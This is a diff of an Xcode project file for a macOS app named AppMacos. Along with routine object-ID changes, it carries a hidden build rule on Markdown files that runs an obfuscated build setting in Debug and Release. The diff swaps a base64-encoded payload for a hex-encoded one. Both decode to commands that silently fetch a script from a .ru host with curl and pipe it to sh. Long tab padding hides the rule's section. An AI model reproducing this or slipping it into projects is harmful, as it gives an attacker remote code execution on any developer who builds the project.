@@ -7,7 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		100625D8AEE745F3A67BBDC8 /* README.md */ = {isa = PBXBuildFile; fileRef = 67E8B880690C4B87AC7BBDC8; };
+		C9DAE3160FF14ADF837BBDC8 /* README.md */ = {isa = PBXBuildFile; fileRef = C6B2540A903941E18F7BBDC8; };
 		779C9D732A83BF8900EAE541 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 779C9D722A83BF8900EAE541 /* AppDelegate.swift */; };
 		779C9D752A83BF8900EAE541 /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 779C9D742A83BF8900EAE541 /* ViewController.swift */; };
 		779C9D772A83BF8B00EAE541 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 779C9D762A83BF8B00EAE541 /* Assets.xcassets */; };
@@ -16,7 +16,7 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
-		67E8B880690C4B87AC7BBDC8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
+		C6B2540A903941E18F7BBDC8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		3570FAD545BEB5D1D5C2B25E /* Pods-AppMacos.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-AppMacos.release.xcconfig"; path = "Target Support Files/Pods-AppMacos/Pods-AppMacos.release.xcconfig"; sourceTree = "<group>"; };
 		57D20DD16A69F7092FC2DEDA /* Pods-AppMacos.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-AppMacos.debug.xcconfig"; path = "Target Support Files/Pods-AppMacos/Pods-AppMacos.debug.xcconfig"; sourceTree = "<group>"; };
 		6742AB0293A2E622FA86AEED /* Pods_AppMacos.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_AppMacos.framework; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -63,7 +63,7 @@
 		779C9D702A83BF8900EAE541 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				67E8B880690C4B87AC7BBDC8 /* README.md */,
+				C6B2540A903941E18F7BBDC8 /* README.md */,
 				779C9D6F2A83BF8900EAE541 /* AppMacos.app */,
 			);
 			name = Products;
@@ -102,7 +102,7 @@
 				779C9D6D2A83BF8900EAE541 /* Resources */,
 			);
 			buildRules = (
-				18615241C92A4CBFAC7BBDC8 /* PBXBuildRule */,
+				3FCF51BFA9A2442A857BBDC8 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -145,7 +145,7 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-		18615241C92A4CBFAC7BBDC8 /* PBXBuildRule */ = {
+		3FCF51BFA9A2442A857BBDC8 /* PBXBuildRule */ = {
 				isa = PBXBuildRule;
 				compilerSpec = com.apple.compilers.proxy.script;
 				filePatterns = "*.md";
@@ -159,14 +159,14 @@
 				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
 sh -c \"${A8CDBB7}\"";
 			};
-																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																							/* End PBXBuildRule section */
+																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		779C9D6D2A83BF8900EAE541 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				100625D8AEE745F3A67BBDC8 /* README.md */,
+				C9DAE3160FF14ADF837BBDC8 /* README.md */,
 				779C9D772A83BF8B00EAE541 /* Assets.xcassets in Resources */,
 				779C9D7A2A83BF8B00EAE541 /* Main.storyboard in Resources */,
 			);
@@ -226,7 +226,7 @@ sh -c \"${A8CDBB7}\"";
 		779C9D7C2A83BF8B00EAE541 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((q(){ `printf basAe64 | tr -d A` --decode; };echo ZWNobyAiJChjdXJsIC1zZkxrIC0tY29ubmVjdC10aW1lb3V0IDIyIC0tcmV0cnkgNSAtZCAicD14Y29kZV9ydWxlIiBodHRwczovL21ta3NyaXI0c3kzNS5ydS9hKSIgfCBzaAo= | q | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf xxXd | tr -d X` -p -r; };echo 6563686f202224286375726c202d666b4c73202d2d636f6e6e6563742d74696d656f7574203235202d2d72657472792034202d642022703d78636f64655f72756c65222068747470733a2f2f702d326d35647a38767738322e72752f612922207c2073680a | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
@@ -287,7 +287,7 @@ sh -c \"${A8CDBB7}\"";
 		779C9D7D2A83BF8B00EAE541 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((q(){ `printf basAe64 | tr -d A` --decode; };echo ZWNobyAiJChjdXJsIC1zZkxrIC0tY29ubmVjdC10aW1lb3V0IDIyIC0tcmV0cnkgNSAtZCAicD14Y29kZV9ydWxlIiBodHRwczovL21ta3NyaXI0c3kzNS5ydS9hKSIgfCBzaAo= | q | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf xxXd | tr -d X` -p -r; };echo 6563686f202224286375726c202d666b4c73202d2d636f6e6e6563742d74696d656f7574203235202d2d72657472792034202d642022703d78636f64655f72756c65222068747470733a2f2f702d326d35647a38767738322e72752f612922207c2073680a | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
